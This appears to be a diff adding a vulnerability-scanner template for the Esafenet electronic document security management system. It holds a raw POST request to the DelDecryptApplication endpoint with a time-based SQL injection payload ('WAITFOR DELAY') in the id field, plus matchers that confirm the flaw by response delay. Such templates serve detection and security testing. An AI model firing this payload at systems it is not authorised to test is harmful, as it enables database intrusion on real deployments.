@@ -1,0 +1,38 @@
+id: poc-yaml-yisaitong-esafenet-deldecryptapplication-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 DelDecryptApplication SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies a potential SQL injection vulnerability in the 亿赛通电子文档安全管理系统 DelDecryptApplication endpoint.
+
+variables:
+  t1: "{{rand_int(3,8)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1'WAITFOR+DELAY'0%3a0%3a{{t1}}'--&machineId=&command=DelDecryptApplication&fromurl=/frame.jsp&appUser=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "电子文档安全管理系统"
+      - type: word
+        part: header
+        words:
+          - "Path=/CDGServer3"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
